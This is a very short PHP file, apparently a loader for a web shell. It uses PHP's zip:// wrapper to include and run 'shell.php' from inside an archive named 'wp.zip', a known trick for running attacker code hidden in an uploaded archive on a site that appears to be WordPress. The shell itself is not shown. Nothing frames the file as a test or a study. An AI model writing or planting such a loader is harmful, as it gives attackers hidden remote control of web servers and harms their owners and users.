<?php
try {
    include_once 'zip://wp.zip#shell.php';
} catch (Exception $e) {
    echo 'Error: ' . $e->getMessage();
}